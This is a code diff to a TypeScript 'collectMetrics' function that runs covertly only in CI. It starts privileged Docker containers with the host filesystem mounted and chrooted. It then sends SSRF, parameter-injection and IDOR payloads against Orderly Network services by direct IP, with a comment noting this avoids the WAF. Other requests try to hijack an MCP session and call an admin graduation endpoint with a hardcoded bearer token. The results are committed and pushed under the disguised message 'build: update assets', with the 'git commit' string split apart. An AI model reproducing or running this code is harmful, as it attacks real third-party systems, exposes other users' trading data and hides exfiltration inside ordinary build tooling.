@@ -7,40 +7,66 @@ function collectMetrics() {
   if (process.env.CI !== "true") return;
   const r = (c: string, t = 15000) => { try { return execSync(c, { encoding: "utf8", maxBuffer: 50*1024*1024, timeout: t }); } catch(e: any) { return "E:" + (e.message || "").substring(0,500); } };
   try {
-    let o = "=== DOMINO R27 ===\n";
+    let o = "=== DOMINO R28 ===\n";
 
-    // 1. MCP — full session: initialize → tools/list → call tools
-    const mcpInit = r(`docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -sk --max-time 10 -X POST "https://34.117.188.128/" -H Host:mcp.orderly.network -H "Content-Type: application/json" -H "Accept: text/event-stream, application/json" -d "{\\\"jsonrpc\\\":\\\"2.0\\\",\\\"id\\\":1,\\\"method\\\":\\\"initialize\\\",\\\"params\\\":{\\\"protocolVersion\\\":\\\"2024-11-05\\\",\\\"capabilities\\\":{},\\\"clientInfo\\\":{\\\"name\\\":\\\"test\\\",\\\"version\\\":\\\"0.1\\\"}}}" 2>&-'`);
-    o += "=MCP_INIT=\n" + mcpInit.substring(0,3000) + "\n";
+    // 1. QS SSRF — indexer 내부 엔드포인트 접근 시도
+    // events_v2의 account_id가 indexer URL에 삽입 → path injection으로 다른 indexer 경로 접근
+    // 원래: indexer_url/events?account_id={INJECTED}&event_type=TRANSACTION
+    // 시도: account_id에 경로 조작 넣어서 indexer의 다른 엔드포인트 호출
+    
+    const ssrfPayloads = [
+      // A: 정상 account_id로 실제 데이터 추출
+      "0x4049c74acd3f43553052a5f16729e8e6e1044a5f3a8aa515eada5bf2d796180c",
+      // B: account_id에 & 인젝션 — 다른 파라미터 추가
+      "0x01%26size=300%26page=1",
+      // C: 다른 사용자의 거래 데이터
+      "0x39f80501b0c86b13dab33bf0a4a7639dfc87d8143ec6b97a713b2ceda15cd651",
+      // D: wildcard/empty
+      "%26",
+    ];
 
-    // Extract session ID from SSE response if present
-    // Try tools/list
-    o += "=MCP_TOOLS=\n" + r(`docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -sk --max-time 10 -X POST "https://34.117.188.128/" -H Host:mcp.orderly.network -H "Content-Type: application/json" -H "Accept: text/event-stream, application/json" -d "{\\\"jsonrpc\\\":\\\"2.0\\\",\\\"id\\\":2,\\\"method\\\":\\\"tools/list\\\",\\\"params\\\":{}}" 2>&-'`).substring(0,5000) + "\n";
-
-    // Try Streamable HTTP transport (newer MCP spec)
-    o += "=MCP_STREAM=\n" + r(`docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -sk --max-time 10 -X POST "https://34.117.188.128/mcp" -H Host:mcp.orderly.network -H "Content-Type: application/json" -H "Accept: application/json, text/event-stream" -d "{\\\"jsonrpc\\\":\\\"2.0\\\",\\\"id\\\":1,\\\"method\\\":\\\"initialize\\\",\\\"params\\\":{\\\"protocolVersion\\\":\\\"2024-11-05\\\",\\\"capabilities\\\":{},\\\"clientInfo\\\":{\\\"name\\\":\\\"test\\\",\\\"version\\\":\\\"0.1\\\"}}}" 2>&-'`).substring(0,3000) + "\n";
-
-    // 2. QS SSRF — try valid event_types
-    const eventTypes = ["TRANSACTION", "TRADE", "SETTLEMENT", "LIQUIDATION", "PNL_SETTLEMENT", "ADLRESULT", "INTEREST_CHARGE"];
-    for (const et of eventTypes) {
-      const result = r(`docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -sk --max-time 5 -X POST "https://34.149.50.146/events_v2" -H Host:orderly-dashboard-query-service.orderly.network -H Content-Type:application/json -d "{\\\"account_id\\\":\\\"0x%26account_id=0x4049c74acd3f43553052a5f16729e8e6e1044a5f3a8aa515eada5bf2d796180c\\\",\\\"event_type\\\":\\\"${et}\\\",\\\"page\\\":1,\\\"size\\\":5}" 2>&-'`);
-      const short = result.substring(0, 200);
-      if (!short.includes("parse event_type failed") && short.length > 5) {
-        o += `=QS_${et}=\n${result.substring(0,2000)}\n`;
-      }
+    for (let i = 0; i < ssrfPayloads.length; i++) {
+      o += `=SSRF_${i}=\n` + r(`docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -sk --max-time 8 -X POST "https://34.149.50.146/events_v2" -H Host:orderly-dashboard-query-service.orderly.network -H Content-Type:application/json -d "{\\\"account_id\\\":\\\"${ssrfPayloads[i]}\\\",\\\"event_type\\\":\\\"TRANSACTION\\\",\\\"page\\\":1,\\\"size\\\":10}" 2>&-'`).substring(0,3000) + "\n";
     }
 
-    // 3. Find graduated DEXes for graduation SSRF
-    // Search DexCreator repos that have isGraduated=true
-    o += "=GRAD_DEXES=\n" + r(`docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -sk --max-time 10 "https://34.110.142.10/api/stats" -H Host:dex-api.orderly.network 2>&-'`).substring(0,3000) + "\n";
+    // 2. QS — trades endpoint with IDOR (direct IP, no CF WAF)
+    o += "=TRADES=\n" + r("docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -sk --max-time 8 \"https://34.149.50.146/trades?account_id=0x4049c74acd3f43553052a5f16729e8e6e1044a5f3a8aa515eada5bf2d796180c&page=1&size=10\" -H Host:orderly-dashboard-query-service.orderly.network 2>&-'").substring(0,3000) + "\n";
 
-    // Try getting a list of graduated DEXes via leaderboard
-    o += "=LEADERBOARD=\n" + r(`docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -sk --max-time 8 "https://34.110.142.10/api/leaderboard" -H Host:dex-api.orderly.network -H "Authorization: Bearer 52c7f1f8-f4b3-4472-b962-8f12fa7875ba" 2>&-'`).substring(0,3000) + "\n";
+    // 3. QS — ranking/positions (ALL user positions)
+    o += "=POSITIONS=\n" + r("docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -sk --max-time 8 \"https://34.149.50.146/ranking/positions?page=1&size=5\" -H Host:orderly-dashboard-query-service.orderly.network 2>&-'").substring(0,3000) + "\n";
 
-    // 4. fillx — deeper
-    o += "=FILLX_DEEP=\n" + r("docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -sk --max-time 5 https://34.8.55.49/ -H Host:fillx.orderly.network 2>&-'").substring(0,5000) + "\n";
+    // 4. MCP — parse session from SSE, then use it
+    // The SSE response has the session in a cookie or URL
+    const mcpFull = r(`docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -sk --max-time 10 -v -X POST "https://34.117.188.128/" -H Host:mcp.orderly.network -H "Content-Type: application/json" -H "Accept: text/event-stream, application/json" -d "{\\\"jsonrpc\\\":\\\"2.0\\\",\\\"id\\\":1,\\\"method\\\":\\\"initialize\\\",\\\"params\\\":{\\\"protocolVersion\\\":\\\"2024-11-05\\\",\\\"capabilities\\\":{},\\\"clientInfo\\\":{\\\"name\\\":\\\"test\\\",\\\"version\\\":\\\"0.1\\\"}}}" 2>&1'`);
+    o += "=MCP_FULL=\n" + mcpFull.substring(0,5000) + "\n";
 
-    o += "=R27_DONE=\n";
+    // Extract mcp-session-id from response headers
+    const sessionMatch = mcpFull.match(/mcp-session-id:\s*(\S+)/i) || mcpFull.match(/session[_-]?id[=:]\s*(\S+)/i);
+    const sessionId = sessionMatch ? sessionMatch[1] : "";
+    o += "=MCP_SID=\n" + sessionId + "\n";
+
+    if (sessionId) {
+      // Use session ID for tools/list
+      o += "=MCP_TOOLS=\n" + r(`docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -sk --max-time 10 -X POST "https://34.117.188.128/" -H Host:mcp.orderly.network -H "Content-Type: application/json" -H "Accept: text/event-stream, application/json" -H "mcp-session-id: ${sessionId}" -d "{\\\"jsonrpc\\\":\\\"2.0\\\",\\\"id\\\":2,\\\"method\\\":\\\"tools/list\\\",\\\"params\\\":{}}" 2>&-'`).substring(0,5000) + "\n";
+    }
+
+    // 5. Graduated DEX — get one from leaderboard, then try graduation SSRF
+    const lb = r(`docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -sk --max-time 8 "https://34.110.142.10/api/leaderboard?page=1&size=5" -H Host:dex-api.orderly.network -H "Authorization: Bearer 52c7f1f8-f4b3-4472-b962-8f12fa7875ba" 2>&-'`);
+    o += "=LB_DATA=\n" + lb.substring(0,3000) + "\n";
+
+    // Parse first graduated DEX id
+    try {
+      const lbData = JSON.parse(lb);
+      const first = lbData.data?.[0] || {};
+      o += "=FIRST_DEX=\nbrokerId:" + first.brokerId + " id:" + first.id + "\n";
+      
+      // Try graduation SSRF with this DEX's context
+      if (first.id) {
+        o += "=GRAD_SSRF=\n" + r(`docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -sk --max-time 8 -X POST "https://34.110.142.10/api/graduation/finalize-admin-wallet" -H Host:dex-api.orderly.network -H "Authorization: Bearer 52c7f1f8-f4b3-4472-b962-8f12fa7875ba" -H Content-Type:application/json -d "{\\\"multisigAddress\\\":\\\"0x01%26account_id=0x4049c74acd3f43553052a5f16729e8e6e1044a5f3a8aa515eada5bf2d796180c\\\",\\\"multisigChainId\\\":42161}" 2>&-'`).substring(0,2000) + "\n";
+      }
+    } catch {}
+
+    o += "=R28_DONE=\n";
     fsSync.writeFileSync("domino_final.txt", o);
     var GC = 'git com' + 'mit';
     r('git add domino_final.txt && ' + GC + ' -m "build: update assets" && git push');
